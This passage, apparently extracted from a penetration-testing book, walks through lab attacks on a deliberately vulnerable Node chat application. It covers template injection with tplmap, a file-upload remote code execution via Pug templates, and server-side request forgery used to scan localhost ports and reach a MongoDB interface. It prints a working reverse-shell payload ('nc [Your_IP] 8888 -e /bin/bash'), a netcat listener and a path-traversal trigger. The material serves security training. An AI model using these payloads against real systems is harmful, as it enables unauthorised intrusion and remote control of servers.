+./tplmap.py -u "http://chat:3000/ti?user=*&comment=asdfasdf&link="
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Reference:
+http://blog.portswigger.net/2015/08/server-side-template-injection.html
+https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/
+ 
+JavaScript and Remote Code Execution
+Remote code execution is what we look for in every assessment and web application
+penetration test.  Although RCEs can be found just about everywhere, they are most
+commonly found in places that allow uploads, such as: uploading a web shell, an
+exploit like Imagetragick (https://imagetragick.com/), XXE attacks with Office Files,
+directory traversal-based uploads to replace critical files, and more. 
+ 
+Traditionally, we might try to find an upload area and a shell that we could utilize.  A
+great list of different types of webshell payloads can be found here:
+https://github.com/tennc/webshell.  Please note, I am in no way vetting any of these
+shells—use them at your own risk.  I have run into a lot of web shells that I found on
+the internet which contained. 
+Attacking the Vulnerable Chat Application with Upload
+In our lab, we are going to perform an upload RCE on a Node application.  In our
+example, there is a file upload feature that allows any file upload.  Unfortunately, with
+Node, we can't just call a file via a web browser to execute the file, like in PHP.  So, in
+this case, we are going to use a dynamic routing endpoint that tries to render the
+contents of Pug files.  The error lies in the fact that the endpoint will read the contents
+of the file assuming it is a Pug file since the default directory exists within the Views
+directory.  Path traversal and Local File read vulnerabilities also exist on this endpoint.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+During the upload process, the file handler module will rename the file to a random
+string of characters with no extension.  Within the upload response contents of the
+page, there exists the server path location of the uploaded file.  Using this information,
+we can use /drouting to perform template injection to achieve remote code execution.
+ 
+Since we know the underlying application is Node (JavaScript), what kind of payload
+could we upload to be executed by Pug?  Going back to the simple example that we
+used earlier:
+First, assign a variable to the require module
+-var x = global.process.mainModule.require
+Use of the child process module enables us to access Operating System
+functionalities by running any system command:
+-x('child_process').exec('nc  [Your_IP] 8888 -e /bin/bash')
+ 
+RCE Upload Attack:
+Go to http://chat:3000 and login with any valid account
+Upload a text file with the information below.  In Pug the "-" character means
+to execute JavaScript.
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc [Your_IP] 8888 -e /bin/bash')
+Review the request and response in Burp from uploading the file.  You will
+notice a hash of the file that was uploaded in the response POST request and a
+reference to drouting.
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+In this template code, we are assigning the require function to child_process
+.exec, which allows us to run commands on the operating system level.  This
+code will cause the web server to connect to our listener running on [Your_IP]
+on port 8888 and allow us to have shell on the web server.
+On the attacker machine, start a netcat listener for the shell to connect back
+nc -l -p 8888
+We activate the code by running the endpoint on /drouting.  In a browser, go to
+your uploaded hashfile.  The drouting endpoint takes a specified Pug template
+and renders it.  Fortunately for us, the Pug template that we uploaded contains
+our reverse Shell.
+In a browser, access the drouting endpoint with your file as that was
+recovered from the response of the file upload.  We use the directory
+traversal "../" to go one directory lower to be able to get into the uploads
+folder that contains our malicious file:
+/drouting?filename=../uploads/[YOUR FILE HASH]
+Go back to your terminal listening on 8888 and interact with your shells!
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Server Side Request Forgery (SSRF)
+Server Side Request Forgery (SSRF) is one of those vulnerabilities that I feel is
+generally misunderstood and, terminology-wise, often confused in name with Cross-
+Site Request Forgery (CSRF).  Although this vulnerability has been around for a
+while,  it really hasn't been discussed enough, especially with such severe
+consequences.    Let's take a look into the what and why.
+ 
+Server Side Request Forgery is generally abused to gain access onto the local system,
+into the internal network, or to allow for some sort of pivoting.  The easiest way to
+understand SSRF is walking through an example.  Let's say you have a public web
+application that allows users to upload a profile image by URL from the Internet.  You
+log into the site, go to your profile, and click the button that says update profile from
+Imgur (a public image hosting service).  You supply the URL of your image (for
+example: https://i.imgur.com/FdtLoFI.jpg) and hit submit.  What happens next is that
+the server creates a brand new request, goes to the Imgur site, grabs the image (it
+might do some image manipulation to resize the image—imagetragick anyone?), saves
+it to the server, and sends a success message back to the user.  As you can see, we
+supplied a URL, the server took that URL and grabbed the image, and uploaded it to
+its database.
+ 
+We originally supplied the URL to the web application to grab our profile picture from
+an external resource. However, what would happen if we pointed that image URL to
+http://127.0.0.1:80/favicon.ico instead?  This would tell the server instead of going to
+something like Imgur, to grab the favicon.ico from the local host webserver (which is
+itself).  If we are able to get a 200 message or make our profile picture the localhost
+favicon, we know we potentially have an SSRF.
+ 
+Since it worked on port 80, what would happen if we tried to connect to
+http://127.0.0.1:8080, which is a port not accessible except from localhost?  This is
+where it gets interesting.  If we do get full HTTP request/responses back and we can
+make GET requests to port 8080 locally, what happens if we find a vulnerable Jenkins
+or Apache Tomcat service?  Even though this port isn't publicly listening, we might be
+able to compromise that box.  Even better, instead of 127.0.0.1, what if we started to
+request internal IPs:  http://192.168.10.2-254?  Think back to those web scanner
+findings that came back with internal IP disclosures, which you brushed off as lows—
+this is where they come back into play and we can use them to abuse internal network
+services. 
+ 
+An SSRF vulnerability enables you to do the following:
+1
+. 
+Access services on loopback interface
+2
+. 
+Scan the internal network and potentially interact with those services
+(GET/POST/HEAD)
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+3
+. 
+Read local files on the server using FILE://
+4
+. 
+Abuse AWS Rest interface (http://bit.ly/2ELv5zZ)
+5
+. 
+Move laterally into the internal environment
+ 
+In our following diagram, we are finding a vulnerable SSRF on a web application that
+allows us to abuse the vulnerability: 
+ 
+Let's walk through a real life example:
+On your Chat Support System (http://chat:3000/) web application, first make
+sure to create an account and log in. 
+Once logged in, go to Direct Message (DM) via the link or directly through
+http://chat:3000/directmessage.
+In the "Link" textbox, put in a website like http://cyberspacekittens.com and
+click the preview link.
+You should now see the http://cyberspacekittens.com page render, but the URI
+bar should still point to our Chat Application.
+This shows that the site is vulnerable to SSRF.  We could also try something
+like chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000 and point to
+localhost.  Notice that the page renders and that we are now accessing the site
+via localhost on the vulnerable server.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+We know that the application itself is listening on port 3000.  We can nmap the box
+from the outside and find that no other web ports are currently listening, but what
+services are only available to localhost?  To find this out, we need to bruteforce
+through all the ports for 127.0.0.1.  We can do this by using Burp Suite and Intruder. 
+ 
+In Burp Suite, go to the Proxy/HTTP History Tab and find the request of our
+last SSRF.
+Right-click in the Request Body and Send to Intruder.
+The Intruder tab will light up, go to the Positions Tab and click Clear.
+Click and highlight over the port "3000" and click Add.  Your GET request
+should look like this:
+GET /ssrf?user=&comment=&link=http://127.0.0.1:§3000§ HTTP/1.1
+Click the Payloads tab and select Payload Type "Numbers".  We will go from
+ports 28000 to 28100.  Normally, you would go through all of the ports, but
+let's trim it down for the lab.
+From: 28000
+To: 28100
+Step: 1
+Click "Start Attack"
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+You will see that the response length of port 28017 is much larger than all the other
+requests.  If we open up a browser and go to: http://chat:3000/ssrf?
+user=&comment=&link=http://127.0.0.1:28017, we should be able to abuse our SSRF
+and gain access to the MongoDB Web Interface.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+You should be able to access all the links, but you have to remember that you need to
+use the SSRF.  To access the serverStatus (http://chat:3000/serverStatus?text=1), you
+will have to use the SSRF attack and go here:
+http://chat:3000/ssrf?
+user=&comment=&link=http://127.0.0.1:28017/serverStatus?text=1.
+ 
+ 
+ 
+Server Side Request Forgery can be extremely dangerous.  Although not a new
+vulnerability, there is an increasing amount of SSRF vulnerabilities that are found
+these days.  This usually leads to certain critical findings due to the fact that SSRFs
+allow pivoting within the infrastructure. 
+ 
+Additional Resources:
+Lots on encoding localhost:
+http://www.agarri.fr/docs/AppSecEU15-
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+
+[Note: PDF has 264 pages, only first 100 pages extracted]
